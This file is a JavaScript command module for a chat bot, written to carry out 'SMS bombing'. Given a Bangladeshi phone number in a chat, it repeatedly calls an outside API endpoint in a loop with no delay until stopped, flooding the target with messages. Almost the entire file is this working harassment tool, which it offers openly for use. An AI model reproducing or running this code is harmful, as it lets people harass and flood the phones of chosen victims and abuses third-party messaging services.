module.exports.config = {
  name: "sms",
  version: "2.0.0",
  hasPermssion: 0,
  credits: "mahim islam", 
  description: "For SMS bombing, use ".sms off" ",
  commandCategory: "Tool",
  usages: ".sms 01xxxxxxxxx or .sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};
 
const axios = require("axios");
const bombingFlags = {};
 
module.exports.run = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];
 
  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("✅ 𝗦𝗠𝗦 𝖻𝗈𝗆𝖻𝗂𝗇𝗀 𝗁𝖺𝗌 𝗇𝗈𝗐 𝗍𝗎𝗋𝗇𝖾𝖽 𝗈𝖿𝖿...! ✈︎ꕥ", threadID);
    } else {
      return api.sendMessage("⚠︎ 𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒉𝒂𝒔 𝒏𝒐 𝒂𝒄𝒕𝒊𝒗𝒆 𝒃𝒐𝒎𝒃𝒊𝒏𝒈...! ☯︎", threadID);
    }
  }
 
  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage("𝖳𝗒𝗉𝖾➪ ".𝘀𝗺𝘀 01𝗑𝗑𝗑𝗑𝗑𝗑𝗑𝗑𝗑" f͟o͟r͟ s͟t͟a͟r͟t͟ b͟o͟m͟b͟i͟n͟g͟...! 𖣘", threadID);
  }
 
  if (bombingFlags[threadID]) {
    return api.sendMessage("Ꙭ 𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒉𝒂𝒔 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒓𝒖𝒏𝒏𝒊𝒏𝒈 ☦︎ 𝒃𝒐𝒎𝒃𝒊𝒏𝒈..!  /n ߷ ᴜsᴇ ".sms off"  ғᴏʀ ᴛᴜʀɴ ɪᴛ ᴏғғ...!", threadID);
  }
 
  api.sendMessage(`✅ 𝗦𝗠𝗦 𝖻𝗈𝗆𝖻𝗂𝗇𝗀 𝗂𝗌 𝗇𝗈𝗐 𝗌𝗍𝖺𝗋𝗍𝖾𝖽 𝗍𝗈 ${number} ☠️\n ⎚ ᴜsᴇ ".sms off" ғᴏʀ ᴛᴜʀɴ ɪᴛ ᴏғғ...! 🙂`, threadID);
 
  bombingFlags[threadID] = true;
 
  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ERROR: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
};
